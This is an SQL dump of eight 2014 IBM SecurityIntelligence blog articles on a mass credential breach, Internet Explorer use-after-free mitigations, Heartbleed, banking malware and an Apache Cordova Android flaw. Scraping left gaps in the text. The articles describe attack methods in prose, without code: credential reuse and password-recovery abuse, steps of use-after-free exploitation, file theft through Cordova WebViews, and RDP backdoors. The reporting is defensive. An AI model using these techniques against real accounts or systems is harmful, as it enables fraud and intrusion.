INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (512, 'Russian Email Data Breach: Top Ways the Data Could Be Used', 'Steven D\'Alfonso', '2014-8-29', 'On Aug. 4, Hold Security announced that a Russian organized crime ring committed a data breach, snatching over 1.2 billion username and password combinations and 500 million email addresses from multiple sources. The email accounts alone account for almost one-third of the world’s email population, making this the   to ever be reported.\n The compromised accounts represent a wide range of organizations in terms of scope, size and location, with personal accounts, small businesses and large, multinational businesses being affected. Some industry experts question the validity of the data, claiming that it was a collection of smaller, previously announced breaches that occurred over the past couple of years.\n Until Aug. 4, Hold Security maintained a fairly low profile in the security and intelligence world. However, with its announcement of the Russian organized crime ring  , the company has amassed an incredible amount of attention and will undoubtedly capitalize on the opportunity. Hold Security has only released limited information about the data breach and has yet to announce the name of the group responsible. The company intends to maintain control of the specifics around the hack and will use it as an avenue to generate revenue.\n According to Sam Frizell of  , the organized crime ring “used networks of infected computers (known as a botnet) that had a computer virus to scour the Internet for vulnerable websites. Whenever a user on an infected computer visited a website, the computer tested the website to see if it was susceptible to hacking. If it was, the criminals flagged the website and returned later with a hack called an SQL injection, which reproduces the website’s database contents.”\n The following is the   thus far regarding the reported data breach:\n Hold Security’s   offers individuals a way to see whether their email addresses or passwords have been compromised.\n The risk of this particular breach lies within human nature since most individuals utilize the same passwords for login credentials on multiple websites. Fraudsters are aware of this habit and use it to their advantage by testing the stolen credentials on various websites. Moreover, the risk of identity theft is much greater in this case than previous mass-compromise  . While costly to the card issuer, a debit or credit card compromise is much easier to remedy; issuers simply monitor card bins and execute a block issue on the entire bin if fraud thresholds are met. However, identity theft represents a more complex issue that requires extensive time and resources to resolve.\n The credentials may be used to cross-check websites that allow email addresses to be used as a username. Since individuals often use one password across multiple sites, the cyber criminals will attempt to enter those credentials into known sites that allow emails to be usernames. Access gained to social networking sites will provide valuable personal information to the fraudsters that will enable further targeted action against the victim.\n Cyber criminals will also modify their cross-site check strategy by using the email account information up to the “@” symbol as a username. For example, JaneDoe@gmail.com would become “JaneDoe” as a username with the email password. Individuals often use their base email address as a username along with their standard password.\n If the email addresses and password checks don’t work, cyber criminals will attempt to retrieve the username and password by clicking the “Forgot Username” and “Forgot Password” prompts that are found on most websites. If the email on record is the same as the compromised one, the cyber criminal will have another chance to gain access by intercepting the recovery email sent to the compromised email account.\n Compromised business or corporate emails may be used as a research tool to potentially develop a spear-phishing campaign against the owner of the corporate email. If the cyber criminals are able to successfully identify the person and company associated with the email, they can craft a spear-phishing email to gain access to the organization’s computer systems through malware delivery.\n The owners of the email accounts will likely begin to receive spam emails, which is the easiest attempt at a compromise. However, the following different variations and levels of sophistication may be used:\n As more information is released about this   and who is responsible, there will be more insight into how this compromised data is being used.', '\'Credentials\', \'Data Breach\', \'Email\', \'Fraud\', \'Organized Crime\', \'Password\', \'Phishing\', \'Red Cell\', \'Security Breach\', \'Spam\', \'Spear Phishing\', \'SQL Injection\'', 'https://securityintelligence.com/russian-email-data-breach-top-ways-the-data-could-be-used/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (513, 'Understanding IE’s New Exploit Mitigations: The Memory Protector and the Isolated Heap', 'Mark Yason', '2014-8-29', 'In a previous article, I explained   and why they are a common bug, especially in large and complex codebases such as Internet Explorer (IE). Because of this, a number of targeted attacks were found to be leveraging zero-day UAF vulnerabilities to infiltrate their targets. This year alone, two well-publicized campaigns leveraged a zero-day IE UAF vulnerability:   (CVE-2014-0322) in February and   (CVE-2014-1776) in April. As a response to these IE UAF vulnerability discoveries and their role in multiple zero-day attacks, Microsoft introduced   that aim to increase the cost of exploiting IE UAF vulnerabilities. Before discussing the new exploit mitigations, let’s first take a look at the two critical steps of UAF exploitation: the “Free operation” and the “Realloc operation.” Using the CVE-2014-0322 zero-day exploit as an example, the diagram below shows how these steps are used to replace a   object with attacker-controlled data. The “Free operation” involves forcefully triggering a free of a target object. In this example, the target   object is freed by executing  ” inside an event handler. This causes pointers to the   object to become dangling pointers and the memory chunk allocated for the   object to be freed and become available for future allocations. Next, the “Realloc operation” attempts to reallocate and control the contents of the memory chunk previously allocated for the freed target object. In this example, by setting the   property of a   element with an attacker-controlled string whose size is equivalent to the size of the   object, two events occur. First, an allocation for memory to store the string is performed; this, in turn, then causes the heap manager to return the chunk previously allocated for the recently freed   object. Second, the attacker-controlled string is written to this reallocated chunk. For UAF exploits to work, the “Free operation” requires the ability to reliably force a free of the target object’s memory chunk, while the “Realloc operation” requires the ability to reliably reallocate the target object’s memory chunk and write arbitrary data to it. The   feature introduced in the July 2014 IE update includes a protected free (also called deferred free) mechanism that makes it difficult to execute the “Free operation” in certain cases. Specifically, it tries to prevent the freeing of a chunk if dangling pointers to it are found in the stack. With the protected free mechanism, when a chunk is about to be freed, instead of actually freeing the chunk, it is added to a chunks list and the chunk’s contents are zeroed-out. When a certain threshold is reached, the chunks list is consulted and the chunks that are safe to free are actually freed. To track to-be-freed chunks and to store other information used when deciding when to perform the actual freeing of the chunks, IE uses the  . The   object is a per-thread object whose pointer is stored in the thread local storage. The TLS index of the   object pointer is tracked by the global variable  . The   object consists of the following fields: The fields of the   structure located at offset +00 of the   object are as follows: The   object structure can be visualized as follows: \n To implement the protected free mechanism,   calls are replaced with a call to   or an in-line version of it.   first checks if the total size of the to-be-freed chunks ( ) is more than or equal to 100,000 bytes or if the force mark-and-reclaim flag ( ) is set. If either of the two is true, a mark-and-reclaim operation to free chunks that are safe to free is performed first. Next, the size of the to-be-freed chunk is added to   and   is incremented. Then, an   entry in the   array is updated to contain the chunk’s address and size.   sets bit 1 of the chunk address if the is chunk is located in the separate, isolated heap. Finally, the contents of the to-be-freed chunk are zeroed-out. An interesting side effect of the protected free mechanism is that UAF bugs will likely manifest themselves as NULL dereference bugs, even if pageheap is enabled. One way to temporarily disable the Memory Protector when performing root cause analysis of IE memory corruption issues is via the   feature control. For the 32-bit IE tab process running on 64-bit Windows, this means setting the following registry entry: As previously mentioned, the mark-and-reclaim operation is performed by   when certain conditions are met. The mark operation performed by   first sorts the chunks list by ascending chunk address. Next, it looks for chunks that are still referenced by pointers in the stack. For this,   fetches each DWORD/pointer value in the thread’s stack and marks the chunks in the chunks list whose address range covers the fetched DWORD/pointer value. Marking involves setting bit 0 of the chunk’s address. Finally, the reclaim operation performed by   simply iterates through the chunks list, frees all unmarked chunks and resets bit 0 of marked chunks. Counters in the   object are also updated in the process. An unconditional reclaim operation performed by   frees all to-be-freed chunks. This unconditional reclaim operation acts as a cleanup routine that is invoked whenever the thread’s stack has fully rewound since the thread’s initial call to  . Currently, a call to   happens every time   is triggered as a result of a window message being received. After discussing the exploit mitigation that makes it difficult to execute the “Free operation” in a UAF exploit, let’s now take a look at the exploit mitigation that will make the “Realloc operation” a challenge: the Isolated Heap. The   feature was introduced in the June 2014 IE update. It aims to limit the options for how an attacker will be able to reallocate and control the chunk contents of certain types of IE objects after they had been freed. This is done by allocating critical objects in an “ ” separate from the heap where other types of objects are allocated. Most of the objects allocated in the Isolated Heap are objects representing HTML elements (most are   objects) and SVG elements (  objects). Some internal objects such as   and   objects are also allocated in the Isolated Heap. Objects stored in the Isolated Heap are those objects that are deemed critical in a way that they are objects that are likely be involved in UAF vulnerabilities. Going back to the CVE-2014-0322 exploit example, if Isolated Heap is implemented, the “Realloc operation” will fail because the string containing the attacker-controlled data will be allocated in the default process heap instead of the separate Isolated Heap where   objects are stored. To implement the Isolated Heap feature, a new heap is created when   is called, and the handle to the newly created heap is stored in the global variable  . Allocation to and freeing from the Isolated Heap simply involves passing the Isolated Heap handle to a call to   or  It is important to understand that the Memory Protector and the Isolated Heap features have some   — instances in which the protection they provide will not be applied. For Memory Protector, in cases where the dangling pointer is stored in the heap instead of the stack, an attacker may be able to force the freeing of a chunk. For Isolated Heap, not all objects that can be potentially leveraged in a UAF exploit are stored in the Isolated Heap, such as the   object in CVE-2012-4969. For these cases, previous techniques for the “Realloc operation” can be used. The introduction of the Memory Protector and the Isolated Heap in IE certainly raises the bar for the exploitation of IE UAF vulnerabilities. It will prevent attackers from easily reusing existing IE UAF exploitation techniques, thereby increasing the cost of developing weaponized exploits for IE UAF vulnerabilities. However, as previous experiences have taught us, determined attackers will adapt either by finding clever ways to get around the exploit mitigations or by favoring the use of other classes of  . It will be very interesting to see what the attackers’ next moves are.', '\'Exploit Mitigations\', \'IBM X-Force Research\', \'Internet Explorer (IE)\', \'Microsoft\', \'Use-After-Free (UAF) Vulnerabilities\', \'Zero-Day Attack\', \'Zero-Day Vulnerability\'', 'https://securityintelligence.com/understanding-ies-new-exploit-mitigations-the-memory-protector-and-the-isolated-heap/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (514, 'Why Heartbleed Still Matters: Hindsight in the Age of Pervasive Exploits', 'Leslie Horacek', '2014-8-25', 'Today, we released the third edition of the  . One of its key features was a look back over the past four months as we analyzed data and trends in the wake of   (CVE-2014-0160), one of the most widespread and impactful security vulnerabilities of all time. From attack trends to vulnerability scoring, this report looks at how relevant this pervasive vulnerability is today and what we can learn about mitigation strategies for similar types of attacks in the future. Additionally, the report looks at overall vulnerability trends for this period and discusses some observations and theories regarding why disclosures may be lower than those made in previous years. So far, the disclosure of the Heartbleed vulnerability in the OpenSSL library has been the biggest event to hit the security industry in 2014. So much has been written about this bug, and yet its effects have been so widespread that it brings a number of discussion topics to the surface. Much emphasis has been placed on preparing for and mitigating zero-day attacks, but in the case of Heartbleed, a more interesting study occurs after disclosure, when both attackers and enterprises are racing against the clock. Attackers want to capitalize on the vulnerability as much as possible before there is a widespread patch campaign, while the enterprise is racing to ensure there are protections in place. IBM’s Managed Security Services (MSS) witnessed attackers immediately retooling and exploiting the bug on a global scale. Once the major vendors for intrusion detection and prevention systems created protection signatures, MSS was able to see just how bad the situation had become. On April 15, 2014, MSS witnessed the largest spike in activity across the customer base, with more than  . That is an average of 3.47 attacks per second for hundreds of customers. One-day attack methods demonstrate how quickly attackers rush to exploit a vulnerability such as Heartbleed. Just one day after the disclosure, a proof-of-concept tool capable of exploiting the Heartbleed bug began to circulate, exposing unpatched systems to skilled and unskilled attackers alike. But more troubling is the fact that also a day after the disclosure, attacks leveraging the vulnerability began to occur. For one-day attacks, the attacker’s goal is to take advantage of the exposure window between when the patches are announced and when the patches are usually deployed. The following are six strategies you can use to mitigate these types of attacks: In the first half of 2014, we reported just over 3,900 new security vulnerabilities affecting 926 unique vendors. If this trend continues through the end of the year, the total projected vulnerabilities would fall below 8,000 total vulnerabilities for the first time since 2011. However, does the current   represent actual risks to networks and systems? The report discusses why this decline in total vulnerabilities might be happening and touches on the subject of the current scoring system. Inherent flaws in the current CVSS(v2) standard and a clear lack of guidelines on how to objectively assess certain types of vulnerabilities often fail to reflect the true risk a vulnerability may pose to an organization. This causes an overall loss of confidence in the CVSS score as an accurate and reliable measure of risk. This report explores the most obvious (latest) example with the OpenSSL vulnerability (Heartbleed), which was rated a medium base score of 5.0. \n With the number of products and systems affected, the time and attention IT teams spent patching systems and responding to customer inquiries and the potential sensitivity of the exposed data, the true impact of Heartbleed was much greater than the CVSS base score would indicate.', '\'Common Vulnerability Scoring System (CVSS)\', \'Heartbleed\', \'Heartbleed OpenSSL Vulnerability\', \'IBM Security\', \'IBM X-Force Report\', \'IBM X-Force Research\', \'OpenSSL\', \'Risk\', \'SQL Injection\', \'SQLi\', \'Threat Intelligence\', \'threats\', \'Vulnerabilities\', \'Zero-Day Vulnerability\'', 'https://securityintelligence.com/xforce-report-2014-q3-heartbleed-still-matters-age-pervasive-exploits/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (515, 'New Variant of Bugat Malware Borrows Lucrative Gameover Zeus Techniques', 'Etay Maor', '2014-8-14', 'Only two months have passed since the international joint operation to bring down the Gameover Zeus (GOZ) botnet. In a combined effort, law enforcement and service providers were able to disrupt the botnet operation and apprehend several of those responsible. The GOZ malware was known for its peer-to-peer-based (P2P) infrastructure, large number of infected devices and sophisticated crime logic that successfully defrauded banks across the globe. IBM Trusteer’s advanced malware researchers have now detected a new variant of the Bugat malware that uses almost identical (and somewhat upgraded) GOZ HTML injections starting to spread throughout the United Kingdom and the Middle East. While Bugat’s (aka, Feodo, Geodo and Cridex) fundamental infrastructure did not change and does not utilize the same P2P infrastructure approach as GOZ, the HTML injections used are very similar — and in some cases identical — to GOZ; that is, the HTML injections and scripts as well as the structure of the attack used by Bugat to target banking applications are GOZ-like. There are two possible explanations for this. First, someone from the GOZ group could have moved to the Bugat team. This would not be the first time something like this has happened, which we’ve witnessed in other cases involving Zeus and  ; however, it is not very likely in this case since Bugat and GOZ are essentially competitors, while Zeus and Citadel are closely related. The second and more likely explanation is that the Bugat team could have analyzed and perhaps reversed the GOZ malware before copying the HTML injections that made GOZ so highly profitable for its operators.\n The new Bugat malware attack on banking applications includes multiple elements for stealing credentials, overcoming two-factor authentication, dealing with IP reputation and other counter-security measures. In some of the attacks, once infected users direct their browser to a bank targeted by the new Bugat variant, the following happens: IBM Trusteer research teams have seen a dramatic drop in the number of GOZ-infected devices and number of successful fraud attempts using this technique since the joint operation against GOZ. However, with this new variant of Bugat malware, the same successful approach seems to be coming back to life by a competing Trojan. To stay protected, organizations can partner with a third-party security company to prevent and detect this new Bugat malware variant and identify its techniques. This is not the first time that the Bugat team copied or reused other proven attack methods, so IBM researchers will continue to monitor and analyze new malware variants for both original and borrowed fraud techniques.', '\'Applications\', \'Banking\', \'Botnets\', \'Citadel Malware\', \'Cridex\', \'Gameover Zeus (GOZ)\', \'HTML Injection\', \'Malware\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/new-variant-of-bugat-malware-borrows-lucrative-gameover-zeus-techniques/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (516, 'Apache Cordova Vulnerability Discovered: 10% of Android Banking Apps Potentially Vulnerable', 'Roee Hay', '2014-8-5', 'The   team has uncovered a serious vulnerability that affects many Android applications built on the   (previously PhoneGap) platform. According to  , this affects  . While 5.8 percent might sound like a low percentage, some widely-used Android applications are built on Cordova. In fact, researchers found that out of the 248 applications tested containing the keyword “bank,” 25 apps were built using Cordova —    . This means an attacker could steal users’ banking credentials and perform transactions, such as withdrawing or transferring funds from their bank account to another account. Those millions of users who use Android Cordova-based apps are at risk of having sensitive information, such as their login credentials, exfiltrated or stolen from these applications, allowing attackers to impersonate them, access their accounts and even make purchases on their behalf. With IBM’s Cyber Security Intelligence Index finding that 95 percent of successful attacks or security incidents were caused by human error, hackers continue to aggressively seek out such vulnerabilities to exploit. Before announcing this vulnerability, IBM Security’s team adhered to its responsible disclosure policy and privately reported security vulnerabilities to the Cordova team. The result is that  . The IBM team’s analysis shows it is   for an attacker to exploit this vulnerability. Under certain circumstances, it can also be   exploited to  , such as cookies associated with the Cordova-based application, by naïve mobile browsing to a malicious website (better known as a drive-by exploitation). The Apache Cordova vulnerabilities enable    , i.e., the execution of a malicious JavaScript (JS) code in the context of Cordova-based apps. In addition, due to other vulnerabilities that we have detected within Cordova, such code can exfiltrate information back to the attacker. Since   uses Apache Cordova, it is affected as well. We at IBM are committed to the security of our clients; thus,   to address this security exposure in Worklight have been published to Fix Central for our 5.0.6.x, 6.0.0.x, 6.1.0.x and 6.2.0.x releases. \n Consider Bob, a user of the fictitious bank Altoro Mutual, which is known for its low security standards. Bob has Altoro’s app installed on his Android device and has recently used this app to access his Altoro bank account. Mallory, the attacker, who is eager to get some money from Bob, has managed to lure Bob to browse her malicious website through a well-crafted phishing email. Alternately, Mallory could have exploited an existing XSS vulnerability in a popular website in order to run malicious JavaScript code in Bob’s browser. This malicious JavaScript can then exploit the Cordova vulnerabilities to steal Bob’s Altoro Mutual login credentials and other sensitive information found in Altoro’s app. From this point forward, Mallory can impersonate Bob at Altoro Mutual by using the stolen credentials and performing transactions, such as funds withdrawals, from his Altoro bank account. Below is a   by David Kaplan ( ) of my team, remotely exploiting the Altoro Mutual application that I developed for the purpose of this demonstration: Android applications are executed in a sandbox environment. The sandbox ensures data confidentiality and integrity, as no app can access sensitive information held by another without proper privileges. For example, Android’s stock browser application holds sensitive information such as cookies, cache and history, which shouldn’t be accessed by third-party apps. The sandbox relies on several techniques, including per-package Linux user-ID assignments. Thus, resources such as files owned by one app cannot be accessed by default by another app. While sandboxing is great for security, it may diminish interoperability; apps would like to talk to each other. Going back to the browser example, the browser would want to invoke the Google Play App when the user browsed to the Google Play website. In order to support this kind of interoperability, Android provides high-level inter-app communication mechanisms. The communication is usually done using special messages called Intents, which hold both the payload and the target application component. Intents can be sent explicitly, where the target application component is specified, or implicitly, where the target is left unspecified and is derived by Android according to other Intent parameters such as its URI scheme, action and category. Application components that open the gate to incoming Intents increase their attack surface. Such components can be attacked locally by   as shown by the next diagram: More severely, under certain circumstances, they can be attacked   as well by a simple click to a malicious website that serves the exploit code:   The WebView object, provided by the Android Framework, allows developers to embed a browser within their own apps. This functionality is great for developing portable apps and is the basis of Apache Cordova. The loaded Web page of the WebView object is controlled by the WebView.loadUrl API. For example, in order to open the IBM website, the developer can write the following code: But what are the implications of an attacker’s controlled URL? Consider the following code: If attackers’ controlled data propagates to this Intent ‘url’ extra parameter, then this code becomes vulnerable to Cross-Application Scripting. Why? Because the attacker can control the ‘url’ extra parameter to load the WebView object with a malicious JS code. Just like Buffer Overflow vulnerabilities, there are some things the execution environment (in this case, the WebView object) can do in order to reduce the probability and impact of successful exploitation. First, JavaScript is off by default and must be explicitly enabled by calling WebSettings.setJavaScriptEnabled(true). Without JavaScript, there is nothing much the attacker can do except maybe conduct a phishing attack. Second, code running in the WebView object is subject to the renowned Same-Origin Policy, where code belonging to some domain can only access the DOM of that specific domain. This greatly reduces the appeal of ‘javascript’ URI scheme payloads and is only interesting if the attacker can force a change of the WebView’s URL after it has already been preloaded with some other URL (in 2011, we  , a XAS vulnerablity in the Android browser that abuses this behavior) or if there are some JavaScript-to-native-code bridges. The attacker is left with another option: abusing the file URI scheme. In the past (Android 4.0 and below), JavaScript code loaded with file URI had universal access to any origin, including local files. This is clearly bad since it allows a trivial theft of sensitive files related to the vulnerable app. Google had realized this threat and provided a third mechanism in Jelly Bean (Android 4.1) and above to prevent exploitation: a pair of APIs that restrict the functionality of JS code loaded from file URIs (  and  ). Both settings are disabled by default and prevent access to any origin and access to other files, respectively. Attackers can influence the URL of Cordova’s WebView in two different ways. Let’s take a look at the first issue: First, the CordovaWebView.loadUrl(String url) and CordovaWebView.loadUrl(String url, int time) consume the Intent’s ‘url’ extra parameter instead of the ‘url’ argument. The first method does that only if the argument’s URI scheme is not JavaScript and the URI is not ‘about:blank’. Therefore, if the ‘url’ extra parameter can be influenced by the attacker (which is often the case), the WebView’s URL can be controlled. The second issue relates to the ‘errorurl’ Intent extra parameter and is very similar despite the fact that it is used only if there is an error when loading the original URL (such as connectivity issues). More about the second issue can be found in our white paper. Exploiting XAS vulnerabilities is harder if the prevention mechanisms mentioned above are enabled. Unfortunately, due to the nature of Cordova-based apps, this is not the case. Let’s take a look at the following code, which is in charge of the WebView’s setup (CordovaWebView.setup): JavaScript must obviously be enabled because Cordova is all about portable apps that can access native facilities using JavaScript bridges. In addition, in order to allow local files to communicate with the outside world, universal access from file URIs is allowed. The fact that JavaScript is enabled and universal access is allowed creates an opportunity for exploitation both remotely (drive-by) and locally by malware. In this post, we will only demonstrates the remote attack; the local one can be found in the advisory. Under certain circumstances (again, for full details, see our white paper), Cordova vulnerabilities can be exploited remotely by a simple click on a naïve website. From this point forward, the exploitation is fully automatic. The goal of the attacker is to steal some sensitive files associated with the vulnerable Cordova-based apps. In this attack, we abuse the file:// URI scheme and the fact that JavaScript and universal access from file URIs are allowed in Cordova. The attack’s outline is as follows (full details can be found in the advisory): The following figure illustrates the attack: For the vast majority of apps, avoiding Cross-Application Scripting issues is rather easy. Unless you truly know what you’re doing, never allow user data to fully control the URL of the WebView object. In addition, exported activities that have no legitimate reason to be as such should be nonexported in the Android Manifest file. Moreover, unless needed, do not enable JavaScript and/or allow universal/file access from file URIs.', '\'Android\', \'Apache Cordova\', \'Banking\', \'Data Exfiltration\', \'IBM X-Force Research\', \'Mobile Security\', \'threats\', \'Vulnerabilities\'', 'https://securityintelligence.com/apache-cordova-phonegap-vulnerability-android-banking-apps/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (517, 'Citadel’s New Trick: Persistent Device Remote Control', 'Etay Maor', '2014-7-29', 'Using malware to control a malware-infected device is nothing new. In fact, in our article about  , Trusteer, an IBM Company, Chief Technology Officer Amit Klein specifically points out that malware will again use old-school techniques to overcome security solutions. One of these tools is the ability to remotely take over a device and use it to commit fraud. Most advanced types of malware have this ability today, including SpyEye’s use of   and Zeus’ and Citadel’s use of  . The security team at Trusteer, an IBM company, has just discovered a Citadel variant that takes this approach a step further, providing enhanced survivability for the attack as well as expanding this malware’s capabilities to perpetrate targeted attacks on enterprises. The use of RDP and VNC protocols to take over devices is widely used by information technology support teams. When users have issues, they can call technical support, and a support engineer can take over the device to solve the problem. Malware authors have added this functionality to their malware to allow the attacker to take over a victim’s device. Attackers who target high-net-worth accounts cannot rely on automated scripts for their attacks since an attack attempting to steal a six- or seven-digit amount has to be carefully and manually conducted. \n This manual process does have benefits, though. First, this evades some security solutions that specifically search for behavior associated with automatic scripts. Second, it allows the attacker to take over an authenticated session and use HTML injection to ask the victim for additional information (such as one-time  ) in real time. Third, it allows the attacker to circumvent device ID   as the attack is coming from the legitimate user’s device, not from the attacker’s device. Citadel, a malware based on Zeus, has offered VNC capabilities since its first version. Additionally, Citadel offers the attacker the ability to run Windows shell commands. These commands are handy if the attacker wants to get a clearer picture of the network in which the infected PC resides, scan it and prepare the grounds for something more than just fraud. This type of network mapping is one of the first steps attackers take in targeted enterprise attacks. They gather intelligence, get a clear picture of the target and then strike. This capability was highlighted when Citadel was introduced to the fraudster underground. Citadel’s advertisement stated, “AutoCMD (This is a good feature to have when analyzing a company’s internal structure).” But Citadel is faced with a problem: If the malware is detected and removed by the victim, the VNC capabilities are lost with it. A recent variant analyzed by Trusteer’s security team demonstrated how attackers, who are likely using Citadel to target enterprises, have found a solution to this problem. The new variant uses a simple yet effective trick. After the device is infected, the ability to run Windows shell commands is used for more than just reconnaissance. The variant also executes the following commands: These commands do the following: Now, even if the Citadel malware is detected and removed, the attacker still has access to the infected machine through the native Windows RDP capabilities. The attacker has set up a backup back door into the infected device. Attackers benefit in the following ways when utilizing such a trick, especially when they are preparing for a persistent, long-term attack against an enterprise: Citadel operators are clearly investing in their attack’s survivability as well as using the malware’s features to target companies, and not even for its original target: financial fraud. Trusteer Rapport (for bank users) and Trusteer Apex (for enterprise users) can detect and prevent Citadel’s infection and its ability to operate with multiple layers of defense that block the threat along with the attack kill chain, preventing the malware from ever infecting the targeted device and running the Windows shell commands. Trusteer’s security team is constantly on the lookout for new and emerging threats and techniques.', '\'Advanced Threats\', \'Citadel Malware\', \'Malware\', \'Remote Desktop Protocol (RDP)\', \'SpyEye\', \'Trojan\', \'Trusteer\', \'Virtual Network Connection (VNC)\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/citadels-new-trick-persistent-device-remote-control/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (518, 'The Father of Zeus: Kronos Malware Discovered', 'Etay Maor', '2014-7-11', 'While major players like Zeus, Gozi, Citadel and other advanced financial malware dominate the malware threat landscape, newcomers and challengers always try to get a share of the cyber crime market. One such new malware that was recently made available for purchase in a Russian underground forum is the Kronos malware. With a $7,000 price tag, this malware offers multiple modules for evading detection and analysis as well as an option to test the malware for a week prior to buying it. We recently found a cyber criminal offering the Kronos malware to members of a major Russian underground forum. The forum post details several of the malware’s technical capabilities and concludes with information on business and purchase options. From the malware’s description, several elements are worth noting: Consistent with other  , it seems that significant time and effort were given to evading security tools used both by end users and security white hats. In addition, the HTML injection mechanism is compatible with Zeus. Because Zeus is the most widely deployed malware, and it is likely that potential clients have used or still use Zeus variants, the authors of Kronos made sure that the HTML injection files used by Zeus operators can be easily implemented with Kronos. Coincidence or not, it is also worth noting that in Greek mythology, Kronos is Zeus’ father. The business side of this offer is interesting as well. Most malware today is sold in the low hundreds of dollars, sometimes even offered for free due to several malware source code leaks. Comparatively, the Kronos malware carries a hefty cost of $7,000. This price, however, is not the first time a new malware seller has demanded a premium. Approximately four years ago, Carberp was released and priced at $10,000 (and $15,000 for the addition of the VNC module, which is almost a standard capability of today’s financial malware). The Kronos seller also offers a one-week testing server for $1,000, during which time a potential client will have access to the malware’s control panel and all the bot’s capabilities. The authors promise to develop new modules for the malware (which will be charged separately), along with updates and bug fixes (free of charge). The preferred payment methods for this deal are various forms of e-currency such as Perfect Money and Bitcoin. As an incentive, early buyers are promised a discounted price. It remains to be seen how popular Kronos will be within the cybercrime community.   continues to monitor underground forums for new threats as well as analyze, reverse engineer and study new malware files.', '\'Carberp\', \'Carberp Trojan\', \'Citadel Malware\', \'Internet Explorer (IE)\', \'Kronos\', \'Malware\', \'Security Tools\'', 'https://securityintelligence.com/the-father-of-zeus-kronos-malware-discovered/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (519, 'Boleto Malware: Two New Variants Discovered', 'George Tubin', '2014-7-10', 'Cyber criminals have been targeting the   in Brazil throughout the past year, leading to an estimated $3.75 billion in losses (  this previously reported number might have been  ), according to a recent report issued by  , the security division of EMC. The report details the actions of one specific fraud ring —   — and discusses the Boleto malware they use to commit fraud. The report is very helpful in exposing this dangerous threat, which is well known to the Brazilian banking industry, to the general public. Like every bit of news, there is always more to the story. Trusteer researchers have discovered two additional malware families targeting the Boleto payment system that operate quite differently from the Eupuds malware variant discussed in the RSA report. These new Boleto malware families are not yet known to the industry as financial, or Boleto-related, malware. Trusteer research shows that approximately one in every 900 machines in Brazil is infected with some form of Boleto malware at any given point. We are now sharing more details on these new malware families to help the industry combat the rising threat of Boleto payment malware. We at Trusteer, an IBM company, have been effectively fighting Boleto — officially “Boleto Bancário” — malware for over a year, successfully protecting our Brazilian bank clients from Boleto-related malware attacks. We would like to take this opportunity to contribute some of our insights to help clarify the current state of this malware. The recent RSA report focuses on one specific type of Boleto malware that uses Web injection techniques to modify Boleto payee fields. Since Boleto malware’s initial discovery early last year, we have seen multiple crime rings develop different types of malware attacks against Boleto payments, with at least three distinct major malware approaches currently in operation. Each of these malware approaches have multiple variants that all aim to modify the Boleto payment data on the client machine. The recent Boleto payment system malware announcements have primarily been focused on one specific family of Boleto malware commonly referred to as Eupuds; an earlier blog from April 2013 discusses  . Eupuds, and similar Boleto variants, modify the Boleto in the Web page (Web inject) to modify the payee fields, diverting funds to fraudster, or mule, accounts. Web injection is a standard modus operandi for advanced financial malware, also commonly used by such malware variants as Zeus, Spyeye, Citadel and most others. One new Boleto malware family discovered by Trusteer uses the   (COM) interface to perform Document Object Model (DOM) manipulations on Internet Explorer browsers. This approach essentially enables the malware to access and change the internal data of targeted Web pages. The malware uses these methods to manipulate payee fields while obfuscating this manipulation to the end user. As an example, Trusteer identified and named one such variant “Domingo” [md5 d972d719aab8f4750ee0b15187dc1ad0]. This sample is currently identified as “generic” by the major AV companies and not as a “Boleto Bancário malware.” Another new Boleto Bancário malware family discovered by Trusteer adds browser extensions to Firefox and Chrome. This malware variant, which we named “Coleto,” is quite new and not yet widely utilized. This malware operates by first downloading and installing a Firefox or Chrome extension. The extension then scans the Web pages for numbers that match the pattern of a Boleto number. Once such a number is found, it substitutes it with another predefined number, thus diverting funds to a fraudster, or mule, account. One of the recommendations provided in the RSA report is to use mobile banking applications since they are immune to this malware — for now. We agree that this approach will work “for now,” but for how long? And at what cost? We expect that the cyber criminals will develop techniques to commit fraud via mobile devices, especially if the PC attack vector becomes less lucrative. Forcing customers to perform transactions via the mobile channel is not considered exemplary customer service; customers should be allowed to transact in the channel most convenient for them. Most of the recommendations provided put far too much onus on the bank customer to recognize when a fraud attempt is taking place. Beyond the impractical end user recommendations, the proposed solutions are mostly “post-mortem,” i.e., based on information attained after the company accesses known command and control (C&C) servers. This approach is far from real-time, occurring after significant fraudulent transactions have been conducted. The most effective way to fight malware-based fraud is at the point of attack: the customer’s device. If malware is not identified and prevented from operating on the customer’s device, all subsequent fraud prevention methods (such as authentication and anomaly detection) can be easily tricked and bypassed by the malware. By focusing on detecting and preventing the root cause of most financial fraud — malware — Trusteer solutions can, in turn, prevent fraudulent transactions from being created before they enter the payments system. The report goes on to mention that Boleto payment system malware can successfully circumvent client-side security plug-ins that hook into the user’s browser.    We recommend focusing on the root cause of fraud and winning the battle at that point. In this case, it is the three variants of Boleto Bancário malware that each utilize a different attack vector — with possibly more variants to come. Trusteer now protects over 1.6 million banking customers in Brazil from Boleto malware and all other forms of dangerous financial malware. Trusteer defenses are effective, adaptable and continually updated to successfully combat the ever-changing malware threat facing financial institutions across the globe.', '\'Banking\', \'Boleto Malware\', \'Brazil\', \'Citadel Malware\', \'Malware\'', 'https://securityintelligence.com/boleto-malware-two-new-variants-discovered/');
